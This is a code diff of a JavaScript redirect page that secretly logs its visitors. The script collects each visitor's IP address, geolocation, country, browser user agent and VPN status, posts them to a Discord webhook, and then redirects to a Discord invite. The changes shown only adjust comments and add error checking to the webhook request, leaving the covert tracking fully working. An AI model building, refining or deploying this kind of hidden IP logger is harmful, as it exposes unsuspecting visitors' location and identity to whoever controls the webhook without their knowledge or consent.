@@ -10,7 +10,7 @@
             const redirectURL = "https://discord.gg/8bRkNbDNsb";  // Redirect URL
 
             try {
-                // Fetch IP and geolocation data
+                // Fetch IP and geolocation data using ip-api.com (no CORS issues for server-side or JSONP usage)
                 const response = await fetch("https://ip-api.com/json/");
                 const data = await response.json();
 
@@ -33,7 +33,7 @@
                 const browser = navigator.userAgent;
                 const flag = `https://countryflagsapi.com/png/${countryCode.toLowerCase()}`;
 
-                // Check VPN status using an external API
+                // Check VPN status using external API
                 const vpnResponse = await fetch(`https://json.geoiplookup.io/${ip}`);
                 const vpnData = await vpnResponse.json();
                 const vpn = vpnData.connection_type === "Corporate" ? "Yes" : "No";
@@ -65,14 +65,19 @@
                 };
 
                 // Send the visitor's data to Discord webhook
-                await fetch(webhookURL, {
+                const webhookResponse = await fetch(webhookURL, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify(payload)
                 });
 
+                // Check if webhook request was successful
+                if (!webhookResponse.ok) {
+                    console.error("Failed to send data to Discord webhook");
+                }
+
             } catch (error) {
-                console.error("Error:", error);
+                console.error("Error during data fetch or sending to webhook:", error);
             } finally {
                 // Redirect after logging the information
                 window.location.href = redirectURL;  // Redirect URL
